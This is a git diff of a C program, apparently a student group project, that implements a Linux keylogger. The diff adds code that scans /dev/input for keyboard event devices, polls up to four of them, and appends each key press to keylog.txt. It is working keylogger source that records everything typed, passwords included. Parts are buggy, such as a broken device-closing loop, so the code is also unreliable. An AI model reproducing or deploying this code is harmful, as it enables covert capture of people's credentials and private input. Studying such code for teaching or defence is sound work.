@@ -1,6 +1,6 @@
 /*
  * Author: Group 14, I2C HSLU
-*/
+ */
 
 // Necessary includes from standard C libraries
 #include <stdio.h>       // Needed for file operations (e.g., fopen, fprintf)
@@ -9,15 +9,53 @@
 #include <unistd.h>      // Needed for close(), read(), and other POSIX functions
 #include <linux/input.h> // Needed for the input_event struct and EV_KEY definitions
 
+#include <poll.h> // polling from different event files
+
 // Constants
-#define KEYBOARD_DEVICE "/dev/input/event23" // Replace the event the actual event number for your keyboard (see /dev/input/by-path)...
-// ^ better possibility??
-// grep -iA6 keyboard /proc/bus/input/devices | grep Sysfs | grep input
+//#define KEYBOARD_DEVICE "/dev/input/event23" // Replace the event the actual event number for your keyboard (see /dev/input/by-path)...
+// readlink -e $(find /dev/input/by-path/ -iname "*kbd*" 2>/dev/null)
 #define LOG_FILE_PATH "keylog.txt"
+#define EVENT_MAX 4 // maximum devices to read keyboard events from
+
+/* 
+ * Get event file
+ */
+
+#include <string.h>
+#include <fcntl.h>
+#include <dirent.h>
+#include <sys/ioctl.h>
+
+// Function to determine if a device is likely a keyboard
+int is_keyboard(const char *device_path) {
+    int fd = open(device_path, O_RDONLY);
+    if (fd < 0) {
+        perror("Failed to open device");
+        return -1;
+    }
+
+    char name[256] = "Unknown";
+    if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) {
+        perror("Failed to get device name");
+        close(fd);
+        return -1;
+    }
+
+    // Filter based on name: Check if "keyboard" appears in the device name
+    if (strcasestr(name, "keyboard")) {
+        printf("Device recognized as keyboard: %s (%s)\n", device_path, name);
+	// let the device open and return the devices fd
+        return fd;
+    } else {
+        printf("Skipping non-keyboard device: %s (%s)\n", device_path, name);
+	close(fd);
+	return 0;
+    }
+}
 
 /*
  * Log keys into file
-*/
+ */
 void log_key(const char *filename, const char *key) {
     FILE *file = fopen(filename, "a");
     if (file == NULL) {
@@ -30,8 +68,9 @@ void log_key(const char *filename, const char *key) {
 
 /*
  * Static mapping of key codes to human readable
- * ... should be chnaged to a dynamic method, like libevdev...
-*/
+ * Linux kernel source: https://elixir.bootlin.com/linux/v6.12.6/source/include/uapi/linux/input-event-codes.h
+ * ... chould be chnaged to a dynamic method, like libevdev...
+ */
 const char* get_key_name(int key_code) {
     static const char *key_names[] = {
         "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
@@ -76,36 +115,99 @@ const char* get_key_name(int key_code) {
 
 /*
  * MAIN PROCEDURE
-*/
+ */
 int main() {
-    struct input_event ev;
-    int fd;
 
-    // Open the keyboard device
-    fd = open(KEYBOARD_DEVICE, O_RDONLY);
-    if (fd == -1) {
-        perror("Error opening input device");
+/*
+ * Get keyboard devices
+ */
+
+    int event_fds[EVENT_MAX];
+    int index = 0; // event index
+    struct dirent *entry;
+    DIR *dir = opendir("/dev/input/");
+    if (!dir) {
+        perror("Failed to open /dev/input/");
         return EXIT_FAILURE;
     }
+
+    printf("Scanning /dev/input/ for keyboard devices...\n");
+
+    while ((entry = readdir(dir)) != NULL) {
+        // Only consider files starting with "event"
+        if (strncmp(entry->d_name, "event", 5) != 0) continue;
+
+        char device_path[PATH_MAX];
+        snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
+
+        event_fds[index] = is_keyboard(device_path);
+	if (event_fds[index] > 0) {
+            printf("Valid keyboard device found: %s\n", device_path);
+	    index++; 
+            // Break after finding the first valid keyboard, or continue if multiple are needed
+            //closedir(dir);
+            //return EXIT_SUCCESS;
+        }
+    }
+
+    closedir(dir);
+
+/*
+ * Open keyboard devices
+ */
+
+
+// should already be opened
+// currently handled above
+
+
+/* 
+ * Log keystrokes
+ */
+
+   // Polling for keystrokes
+   struct pollfd fds[EVENT_MAX];
+   for (int i = 0; i < index; i++) {
+       fds[i].fd = event_fds[i];
+       fds[i].events = POLLIN; // Monitor for readable data
+   }
+
 
     printf("Logging keystrokes to %s\n", LOG_FILE_PATH);
 
     // loop
     while (1) {
+   
+         int ret = poll(fds, index, -1); // Wait indefinitely for an event
+         if (ret < 0) {
+             perror("Poll error");
+             break;
+         }
+
 	// reading keystrokes
-        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
-            perror("Error reading input event");
-            break;
-        }
-	
-	// Key mapping and logging
-        if (ev.type == EV_KEY && ev.value == 1) { // Key press
-            const char *key_name = get_key_name(ev.code);
-            log_key(LOG_FILE_PATH, key_name);
-        }
+	for(int i=0; i<index;i++) {
+	  if(fds[i].revents & POLLIN) {
+              struct input_event ev;
+              if (read(fds[i].fd, &ev, sizeof(struct input_event)) < 0) {
+                  perror("Error reading input event");
+                  break;
+              } else {
+	        // Key mapping and logging
+                if (ev.type == EV_KEY && ev.value == 1) { // Key press
+                    const char *key_name = get_key_name(ev.code);
+                    log_key(LOG_FILE_PATH, key_name);
+		}
+	    }
+          }
+	}
     }
 
-    // Close device
-    close(fd);
+/*
+ * Close keyboard devices
+ */
+for(int i=index-1; i<=0; index--) {
+    close(event_fds[i]);
+}
+
     return 0;
 }
